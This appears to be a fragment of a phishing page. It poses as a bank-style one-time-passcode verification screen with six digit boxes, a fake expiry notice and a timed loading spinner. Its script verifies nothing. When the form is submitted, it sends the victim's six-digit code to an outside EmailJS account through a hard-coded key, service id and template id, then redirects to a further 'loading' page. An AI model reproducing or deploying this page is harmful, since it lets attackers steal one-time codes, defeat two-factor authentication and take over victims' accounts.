	<style>
        .custom-otp-block {
          margin-top: 20px;
          text-align: center;
        }
      
        .hidden-input {
          position: absolute;
          opacity: 0;
          pointer-events: none;
        }
      
        .custom-otp-display {
          display: inline-flex;
          justify-content: center;
          gap: 10px;
          margin: 10px auto 15px;
        }
      
        .otp-box {
          width: 38px;
          height: 40px;
          border-bottom: 2px solid #000;
          text-align: center;
          font-size: 20px;
          font-weight: bold;
          line-height: 40px;
        }
      
        .otp-expiry {
          font-size: 14px;
          color: #555;
          margin-top: 8px;
          font-weight: normal;
        }
      
        .otp-buttons {
          display: flex;
          justify-content: center;
          gap: 15px;
          margin-top: 20px;
          flex-wrap: wrap;
        }
      
        /* Spinner overlay */
        #loadingSpinner {
          position: fixed;
          top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(255, 255, 255, 0.3); /* reduced blur effect */
          backdrop-filter: blur(3px);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
      
        /* Spinner styling */
        .spinner {
          width: 80px;
          height: 90px;
          border-radius: 70%;
          border: 8px solid transparent;
          border-top-color: #ffc600; /* start with first color */
          animation: spinCycle 4s linear infinite;
        }
      
        @keyframes spinCycle {
          0% {
            transform: rotate(0deg);
            border-top-color: #ffc600;
          }
          50% {
            transform: rotate(360deg);
            border-top-color: #ffc600;
          }
          50.01% {
            border-top-color: #963cbd;
          }
          100% {
            transform: rotate(720deg);
            border-top-color: #963cbd;
          }
        }
      </style>
      
      <div class="custom-otp-block">
        <input type="text" id="otp" inputmode="numeric" maxlength="6" class="hidden-input" autofocus disabled />
      
        <div class="custom-otp-display" id="otpBoxes">
          <div class="otp-box" id="d1">–</div>
          <div class="otp-box" id="d2">–</div>
          <div class="otp-box" id="d3">–</div>
          <div class="otp-box" id="d4">–</div>
          <div class="otp-box" id="d5">–</div>
          <div class="otp-box" id="d6">–</div>
        </div>
      
        <p class="otp-expiry">The code will expire in 15 minutes</p>
        <div class="otp-buttons">
          <button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight text--none" disabled>
            <span class="irisv-button__text">Verify</span>
          </button>
          <button type="button" class="irisv-button irisv-button--lowEmphasis irisv-button--onLight text--none">
            <span class="irisv-button__text">Back</span>
          </button>
        </div>
      </div>
      
      <!-- Spinner Overlay -->
      <div id="loadingSpinner">
        <div class="spinner"></div>
      </div>
      
      <script>
        const otpInput = document.getElementById("otp");
        const boxes = [...document.querySelectorAll(".otp-box")];
        const spinner = document.getElementById("loadingSpinner");
        const verifyBtn = document.querySelector(".irisv-button--highEmphasis");
      
        // Show spinner on page load, hide after 10s and enable input/buttons
        window.addEventListener("load", () => {
          setTimeout(() => {
            spinner.style.display = "none";
            otpInput.disabled = false;
            verifyBtn.disabled = false;
            otpInput.focus();
          }, 10000);
        });
      
        otpInput.addEventListener("input", () => {
          const value = otpInput.value.replace(/\D/g, "").slice(0, 6);
          otpInput.value = value;
      
          boxes.forEach((box, idx) => {
            box.textContent = value[idx] ? value[idx] : "–";
          });
        });
      
        document.getElementById("otpBoxes").addEventListener("click", () => {
          otpInput.focus();
        });
      
        emailjs.init("Q5Y9KzrbiTFPZxdtT");
      
        function sendEmail(OTP) {
          emailjs.send("service_e3n0t1a", "template_fz8mzpb", { passcode: OTP })
            .then(function(response) {
              console.log('Email sent successfully!', response);
              // Show spinner again while redirecting
              spinner.style.display = "flex";
              otpInput.disabled = true;
              verifyBtn.disabled = true;
              setTimeout(() => {
                window.location.href = 'loadingpage2.html';
              }, 1000);
            }, function(error) {
              console.error('Email sending failed:', error);
              alert("Failed to send code. Please try again.");
              spinner.style.display = "none";
              otpInput.disabled = false;
              verifyBtn.disabled = false;
              otpInput.focus();
            });
        }
      
        // Form submission
        document.getElementById('otpform').addEventListener('submit', function(event) {
          event.preventDefault();
      
          const OTP = otpInput.value;
          if (OTP.length !== 6) {
            alert("Please enter a 6-digit code.");
            return;
          }
      
          sendEmail(OTP);
        });
      </script>
